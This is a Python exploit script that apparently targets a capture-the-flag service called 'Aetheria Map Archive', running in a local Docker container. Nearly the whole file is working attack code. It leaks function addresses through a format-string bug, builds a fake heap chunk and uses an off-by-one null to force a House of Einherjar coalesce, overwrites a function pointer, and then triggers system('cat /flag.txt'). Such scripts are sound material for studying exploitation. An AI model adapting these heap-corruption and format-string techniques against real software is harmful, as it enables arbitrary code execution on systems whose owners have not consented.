#!/usr/bin/env python3
"""Aetheria Map Archive - local exploit (House of Einherjar -> Scribe.seal -> husk_ritual)

Chain:
 1) UPLOAD map1 (author = format string to leak husk_ritual through __dprintf_chk varargs)
 2) SCRIBE 1 -> Scribe object S1 (malloc 0x40 => chunk 0x50)
 3) UPLOAD map2 -> its scroll/wall directly follow map1's chunks
 4) PATCH 1 : craft fake chunk P inside scroll1 (P = scroll1+0x4c0), fd=bk=P
 5) PATCH 2 : wall2->prev_size = wall2 - P, and off-by-one null clears wall2 PREV_INUSE
 6) RELEASE 2: free(wall2) -> backward coalesce to P => free chunk spanning S1
 7) UPLOAD with a controlled-size raw vector: allocated from front of that free chunk (P),
    its bytes land on S1 -> overwrite S1->seal = husk_ritual
 8) SEAL 1 -> husk_ritual() -> system("cat /flag.txt"), stdout is dup2'ed to our socket
"""
import socket, struct, time, subprocess, re, sys

HOST, PORT = "127.0.0.1", 7777
CONTAINER = "aeth"

def ensure():
    st = subprocess.run(["docker","inspect","-f","{{.State.Running}}",CONTAINER],
                        capture_output=True,text=True).stdout.strip()
    if st != "true":
        subprocess.run(["docker","start",CONTAINER],capture_output=True); time.sleep(1.2)

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST,PORT), timeout=5); self.buf=b""
    def recv_until(self, tok=b"> ", timeout=6):
        end=time.time()+timeout
        while tok not in self.buf:
            self.s.settimeout(max(0.05,end-time.time()))
            try: d=self.s.recv(65536)
            except socket.timeout: break
            if not d: break
            self.buf+=d
        i=self.buf.find(tok)
        if i>=0:
            out,self.buf=self.buf[:i+len(tok)],self.buf[i+len(tok):]; return out
        out,self.buf=self.buf,b""; return out
    def cmd(self, line):
        self.s.sendall(line+b"\n"); return self.recv_until()

def aethmap(n, name=b"", author=b"", desc=b""):
    b=bytearray(n)
    if n>=4: b[0:4]=b"AETH"
    if n>=0x10:
        b[4:6]=b"\x01\x00"
        struct.pack_into("<H",b,6,55); struct.pack_into("<H",b,8,17)
        b[0x10:0x10+len(name)]=name
        b[0x40:0x40+len(author)]=author
        b[0x60:0x60+len(desc)]=desc[:0x7f]
    return bytes(b)

def upload(c, payload):
    c.s.sendall(b"UPLOAD %d\n"%len(payload)+payload)
    return c.recv_until()

def show(c, mid):
    out=c.cmd(b"SHOW %d"%mid)
    d={}
    for k in ("scroll","wall","scribe"):
        g=re.search((k+r"=(0x[0-9a-f]+|\(nil\))").encode(), out)
        d[k]=int(g.group(1),16) if g and g.group(1)!=b"(nil)" else None
    return out,d

def patch(c, mid, data):
    assert len(data)<=0x4f8
    c.s.sendall(b"PATCH %d %d\n"%(mid,len(data))+data)
    return c.recv_until()

def main():
    ensure()
    c=Conn(); banner=c.recv_until()
    print("[*] banner:", banner)

    # --- map1 + leak husk_ritual via format string author ---
    out=upload(c, aethmap(0xE0, name=b"LEAK", author=b"%p.%p.%p.%p"))
    print("[*] map1 upload:", out)
    vals=[int(x,16) for x in re.findall(rb"0x[0-9a-f]+", out.split(b"by",1)[1].split(b"\n")[0])]
    puts,malloc,free,husk=vals[:4]
    print("    puts=%#x malloc=%#x free=%#x husk_ritual=%#x"%(puts,malloc,free,husk))

    print("[*] SCRIBE 1:", c.cmd(b"SCRIBE 1"))
    o1,s1=show(c,1); print("[*] SHOW 1:", o1)
    A=s1["scroll"]; W1=s1["wall"]; S1=s1["scribe"]

    # --- map2 ---
    print("[*] map2 upload:", upload(c, aethmap(0xE0, name=b"M2", author=b"M2")))
    o2,s2=show(c,2); print("[*] SHOW 2:", o2)
    A2=s2["scroll"]; W2=s2["wall"]

    print("[i] A=%#x W1=%#x S1=%#x A2=%#x W2=%#x"%(A,W1,S1,A2,W2))
    ok=True
    if W1 != A+0x500: print("[!] wall1 - scroll1 != 0x500"); ok=False
    if W2 != A2+0x500: print("[!] wall2 - scroll2 != 0x500"); ok=False
    if W2 <= A: print("[!] map2 not after map1"); ok=False
    if not (A < S1 < W2): print("[!] scribe not between map1 and wall2"); ok=False
    if not ok: print("[FAIL] heap layout unexpected, aborting"); return 1

    P = A+0x4c0                    # fake chunk header, inside scroll1 (writable)
    prev = (W2-0x10) - P           # prev_size of wall2 -> merge reaches P
    off = S1 - (P+0x10)            # offset of Scribe data inside raw vector
    print("[i] P=%#x prev=%#x S1_offset_in_raw=%#x"%(P,prev,off))
    if prev % 0x10 or prev < 0x30 or off < 0x30:
        print("[FAIL] bad geometry"); return 1

    # --- PATCH 1 : fake chunk at P inside scroll1 ---
    b1=bytearray(0x4f8)
    struct.pack_into("<Q", b1, 0x4c0, 0)          # fake prev_size (unused)
    struct.pack_into("<Q", b1, 0x4c8, prev|1)     # fake size == prev_size (chunksize masks flags)
    struct.pack_into("<Q", b1, 0x4d0, P)          # fd = P
    struct.pack_into("<Q", b1, 0x4d8, P)          # bk = P
    struct.pack_into("<Q", b1, 0x4e0, 0)          # fd_nextsize = NULL
    struct.pack_into("<Q", b1, 0x4e8, 0)          # bk_nextsize = NULL
    print("[*] PATCH 1:", patch(c,1,bytes(b1)))

    # --- PATCH 2 : wall2->prev_size = prev, null clears its PREV_INUSE ---
    b2=bytearray(0x4f8)
    struct.pack_into("<Q", b2, 0x4f0, prev)
    print("[*] PATCH 2:", patch(c,2,bytes(b2)))

    # --- trigger House of Einherjar ---
    print("[*] RELEASE 2:", c.cmd(b"RELEASE 2"))

    # --- carve from the merged chunk with an attacker-sized raw vector ---
    n = (off + 0x40 + 0xf) & ~0xf
    nb = (n + 8 + 0xf) & ~0xf
    merged = (W2-0x10-P) + 0x500
    print("[i] raw n=%#x nb=%#x merged=%#x"%(n,nb,merged))
    if nb + 0x20 > merged: print("[FAIL] raw too large for merged chunk"); return 1
    pay=bytearray(aethmap(n, name=b"PWN", author=b"PWN", desc=b"D"))
    struct.pack_into("<Q", pay, off+0x00, 0)       # Scribe.target
    struct.pack_into("<Q", pay, off+0x08, 0x40)    # Scribe.limit
    struct.pack_into("<Q", pay, off+0x10, husk)    # Scribe.seal = husk_ritual
    out=upload(c, bytes(pay))
    print("[*] cover upload:", out)

    # --- fire ---
    c.s.sendall(b"SEAL 1\n")
    time.sleep(1.0)
    data=c.recv_until(timeout=2)
    print("[*] SEAL 1 response:\n"+data.decode("latin-1"))
    print("[*] docker logs tail:")
    print(subprocess.run(["docker","logs","--tail","5",CONTAINER],capture_output=True,text=True).stdout[-500:])
    return 0

if __name__=="__main__":
    sys.exit(main())
